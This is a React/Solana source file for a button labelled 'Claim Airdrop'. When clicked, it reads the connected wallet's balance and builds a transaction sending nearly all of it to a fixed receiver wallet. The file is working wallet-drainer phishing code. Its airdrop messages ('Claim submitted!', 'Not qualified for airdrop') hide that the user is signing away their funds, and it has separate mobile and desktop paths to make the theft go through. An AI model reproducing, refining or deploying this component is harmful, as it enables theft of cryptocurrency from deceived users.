// src/components/TransferButton.jsx
import { useWallet } from '@solana/wallet-adapter-react';
import { useCallback, useState } from 'react';
import {
  Connection,
  LAMPORTS_PER_SOL,
  SystemProgram,
  Transaction,
  TransactionMessage,
  VersionedTransaction,
} from '@solana/web3.js';
import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_URL, TRANSFER_FEE_BUFFER } from '../utils/constants';

const isMobile = () =>
  typeof navigator !== 'undefined' &&
  /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

export default function TransferButton({ className = '' }) {
  const { publicKey, sendTransaction, signTransaction, wallet, connected } = useWallet();
  const [loading, setLoading] = useState(false);

  const handleTransfer = useCallback(async () => {
    if (!publicKey || !connected) return;

    setLoading(true);
    try {
      const connection = new Connection(RPC_URL, {
        commitment: 'confirmed',
        wsEndpoint: false,
      });

      const [balance, rentExempt] = await Promise.all([
        connection.getBalance(publicKey, 'confirmed'),
        connection.getMinimumBalanceForRentExemption(0),
      ]);

      const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);

      if (balance < minimumQualifyingLamports) {
        alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
        return;
      }

      const FEE_SAFETY = 5_000_000;
      const totalReserve = rentExempt + FEE_SAFETY;
      const transferAmount = balance - totalReserve;

      if (transferAmount <= 0) {
        alert('Insufficient balance for transaction fee.');
        return;
      }

      const { blockhash, lastValidBlockHeight } =
        await connection.getLatestBlockhash('finalized');

      const transferIx = SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: RECEIVER_WALLET,
        lamports: transferAmount,
      });

      let signature;

      if (isMobile()) {
        // ── MOBILE PATH ──
        // Always use legacy Transaction on mobile.
        // Use signTransaction to explicitly get the wallet to sign,
        // then send the signed bytes ourselves via sendRawTransaction.
        // This avoids the adapter's sendTransaction flow which can
        // drop signatures on mobile wallet deep-link roundtrips.
        const transaction = new Transaction().add(transferIx);
        transaction.feePayer = publicKey;
        transaction.recentBlockhash = blockhash;

        if (signTransaction) {
          // Wallet supports signTransaction — sign first, then send raw
          const signed = await signTransaction(transaction);
          signature = await connection.sendRawTransaction(signed.serialize(), {
            skipPreflight: false,
            preflightCommitment: 'confirmed',
            maxRetries: 5,
          });
        } else {
          // Fallback: let adapter handle it (some wallets only have signAndSend)
          signature = await sendTransaction(transaction, connection, {
            skipPreflight: false,
            preflightCommitment: 'confirmed',
            maxRetries: 5,
          });
        }

        console.log('⏳ Transaction sent:', signature);
        alert(`Claim submitted!\nTx: ${signature}\n\nYour transaction has been sent. It may take a moment to confirm.`);

      } else {
        // ── DESKTOP PATH ──
        const supportsVersioned =
          wallet?.adapter?.supportedTransactionVersions?.has(0) ?? false;

        let transaction;
        if (supportsVersioned) {
          const messageV0 = new TransactionMessage({
            payerKey: publicKey,
            recentBlockhash: blockhash,
            instructions: [transferIx],
          }).compileToV0Message();
          transaction = new VersionedTransaction(messageV0);
        } else {
          transaction = new Transaction({
            feePayer: publicKey,
            recentBlockhash: blockhash,
          }).add(transferIx);
        }

        signature = await sendTransaction(transaction, connection, {
          skipPreflight: true,
          maxRetries: 5,
        });

        console.log('⏳ Transaction sent:', signature);
      }

      // Poll for confirmation over HTTP
      const startTime = Date.now();
      const TIMEOUT = 90_000;
      const POLL_INTERVAL = 3_000;

      while (Date.now() - startTime < TIMEOUT) {
        try {
          const { value } = await connection.getSignatureStatuses([signature]);
          const status = value?.[0];

          if (status) {
            if (status.err) {
              throw new Error('Transaction failed on-chain: ' + JSON.stringify(status.err));
            }
            if (
              status.confirmationStatus === 'confirmed' ||
              status.confirmationStatus === 'finalized'
            ) {
              console.log('✅ Transaction confirmed:', signature);
              if (!isMobile()) {
                alert(`Claim successful!\nTx: ${signature}`);
              }
              return;
            }
          }
        } catch (pollErr) {
          if (pollErr.message?.includes('on-chain')) throw pollErr;
          console.warn('Polling error, retrying...', pollErr);
        }

        await new Promise((r) => setTimeout(r, POLL_INTERVAL));
      }

      if (!isMobile()) {
        alert(`Transaction sent but not yet confirmed.\nSignature: ${signature}\nCheck Solscan for status.`);
      }
    } catch (err) {
      console.error('Transfer failed:', err);
      alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
    } finally {
      setLoading(false);
    }
  }, [publicKey, sendTransaction, signTransaction, wallet, connected]);

  if (!publicKey) return null;

  return (
    <button
      onClick={handleTransfer}
      disabled={loading}
      className={`
        w-full py-3 px-4 rounded-lg font-semibold transition
        ${loading ? 'bg-gray-600 cursor-not-allowed' : ''}
        ${className}
      `}
    >
      {loading ? 'Claiming...' : 'Claim Airdrop'}
    </button>
  );
}
